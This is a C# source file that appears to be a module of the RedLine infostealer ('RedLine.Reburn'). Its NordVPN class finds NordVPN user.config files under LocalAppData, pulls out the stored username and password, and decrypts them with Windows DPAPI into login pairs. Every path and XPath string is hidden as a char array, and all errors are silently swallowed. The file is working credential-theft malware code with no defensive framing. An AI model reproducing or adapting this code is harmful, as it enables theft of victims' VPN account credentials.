using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class NordVPN
{
	public static List<LoginPair> GetProfile()
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Constants.LocalAppData, new string(new char[7] { 'N', 'o', 'r', 'd', 'V', 'P', 'N' })));
			if (!directoryInfo.Exists)
			{
				return list;
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories(new string(new char[12]
			{
				'N', 'o', 'r', 'd', 'V', 'p', 'n', '.', 'e', 'x',
				'e', '*'
			}));
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories2)
				{
					try
					{
						string text = Path.Combine(directoryInfo2.FullName, new string(new char[11]
						{
							'u', 's', 'e', 'r', '.', 'c', 'o', 'n', 'f', 'i',
							'g'
						}));
						if (!File.Exists(text))
						{
							continue;
						}
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode(new string(new char[33]
						{
							'/', '/', 's', 'e', 't', 't', 'i', 'n', 'g', '[',
							'@', 'n', 'a', 'm', 'e', '=', '\'', 'U', 's', 'e',
							'r', 'n', 'a', 'm', 'e', '\'', ']', '/', 'v', 'a',
							'l', 'u', 'e'
						}))!.InnerText;
						string innerText2 = xmlDocument.SelectSingleNode(new string(new char[33]
						{
							'/', '/', 's', 'e', 't', 't', 'i', 'n', 'g', '[',
							'@', 'n', 'a', 'm', 'e', '=', '\'', 'P', 'a', 's',
							's', 'w', 'o', 'r', 'd', '\'', ']', '/', 'v', 'a',
							'l', 'u', 'e'
						}))!.InnerText;
						if (!string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(innerText2))
						{
							string @string = Encoding.UTF8.GetString(CryptoHelper.DecryptBlob(Convert.FromBase64String(innerText), (DataProtectionScope)1));
							string string2 = Encoding.UTF8.GetString(CryptoHelper.DecryptBlob(Convert.FromBase64String(innerText2), (DataProtectionScope)1));
							if (!string.IsNullOrWhiteSpace(@string) && !string.IsNullOrWhiteSpace(string2))
							{
								list.Add(new LoginPair
								{
									Login = @string,
									Password = string2
								});
							}
						}
					}
					catch
					{
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
